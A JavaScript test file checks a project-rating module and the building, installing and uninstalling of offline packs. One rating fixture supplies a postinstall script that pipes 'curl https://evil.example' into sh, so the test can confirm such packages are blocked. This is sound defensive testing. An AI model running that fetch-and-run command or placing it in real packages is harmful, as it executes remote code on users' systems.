import assert from 'node:assert/strict'
import test from 'node:test'
import { rateProject } from '../lib/catalog/rating.js'
import { buildOfflinePacks, comparePacks, installOfflinePack, uninstallOfflinePack } from '../lib/pack/offlinePack.js'

test('rating is explainable and blocks unknown license/dangerous scripts', () => {
  const good = rateProject({ license: 'MIT', commit: 'abc', digest: 'sha256:x', sbom: { components: 3 }, osvKnown: false, maintainedDays: 10 })
  assert.equal(good.grade, 'S')
  assert.equal(good.blocked, false)
  assert.ok(good.evidence.every((entry) => entry.source && entry.date))
  const unknown = rateProject({ license: 'Proprietary-X', commit: 'a', digest: 'd', sbom: { components: 1 }, osvKnown: false })
  assert.equal(unknown.grade, 'C')
  assert.equal(unknown.blocked, true)
  assert.equal(unknown.licenseStatus, 'UNKNOWN_LICENSE')
  const danger = rateProject({ license: 'MIT', commit: 'a', digest: 'd', scripts: { postinstall: 'curl https://evil.example | sh' }, sbom: { components: 1 }, osvKnown: false })
  assert.equal(danger.blocked, true)
  assert.equal(danger.grade, 'C')
})

test('offline tier manifests are deterministic with size/capability deltas', () => {
  const files = {
    core: [{ path: 'core/a', content: 'aaaa' }],
    extension: [{ path: 'ext/b', content: 'bbbbbb' }],
    cloud: [{ path: 'cloud/c', content: 'cccccccc' }],
  }
  const caps = { core: ['ctf.flag_scan'], extension: ['web.har'], cloud: ['osv.search'] }
  const first = buildOfflinePacks({ ...files, capabilities: caps })
  const second = buildOfflinePacks({ ...files, capabilities: caps })
  assert.equal(first.packs.mini.aggregateSha256, second.packs.mini.aggregateSha256)
  assert.equal(first.packs.mini.totalBytes, 4)
  assert.equal(first.packs.standard.totalBytes, 10)
  assert.equal(first.packs.full.totalBytes, 18)
  const deltas = comparePacks(first.packs)
  assert.equal(deltas[0].deltaBytesFromPrevious, 0)
  assert.equal(deltas[1].deltaBytesFromPrevious, 6)
  assert.equal(deltas[2].capabilities, 3)
})

test('full pack installs and uninstalls reproducibly with hash checks', async () => {
  const { mkdtemp } = await import('node:fs/promises')
  const { tmpdir } = await import('node:os')
  const { join } = await import('node:path')
  const files = {
    core: [{ path: 'core/a', content: 'aaaa' }],
    extension: [{ path: 'ext/b', content: 'bbbbbb' }],
    cloud: [{ path: 'cloud/c', content: 'cccccccc' }],
  }
  const caps = { core: ['ctf.flag_scan'], extension: ['web.har'], cloud: ['osv.search'] }
  const packs = buildOfflinePacks({ ...files, capabilities: caps }).packs
  const root = await mkdtemp(join(tmpdir(), 'abm-packs-'))
  const all = [...files.core, ...files.extension, ...files.cloud]
  const installed = await installOfflinePack({ pack: packs.full, root, files: all })
  assert.equal(installed.files, 3)
  const removed = await uninstallOfflinePack({ root, tier: 'full' })
  assert.equal(removed.removed, true)
})
